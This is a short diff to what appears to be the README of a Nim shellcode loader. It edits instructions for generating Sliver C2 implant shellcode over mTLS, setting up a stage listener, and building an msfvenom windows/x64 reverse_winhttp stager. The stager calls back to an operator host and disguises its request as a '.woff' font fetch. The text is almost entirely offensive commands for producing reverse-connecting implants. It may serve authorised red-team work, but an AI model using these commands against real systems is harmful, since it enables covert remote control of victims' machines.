@@ -47,10 +47,10 @@ nim c -d:noRES NimSyscallLoader.nim
 # Raw shellcode (full implant as PIC)
 sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
 
-# Or a staged payload (needs a stage-listener running)
+# Or a small msfvenom stager (needs a stage-listener running)
 sliver > profiles new --mtls <IP>:<PORT> --format shellcode my-profile
-sliver > stage-listener --url http://<IP>:8080 --profile my-profile
-sliver > profiles stage --save /tmp/stage2.bin my-profile
+sliver > stage-listener --url http://<IP>:8080 --profile my-profile --prepend-size
+msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=8080 LURI=/hello.woff -f raw -o /tmp/stager.bin
 ```
 
 You can also pack a standalone `.exe` (`--format exe`) or a .NET assembly.
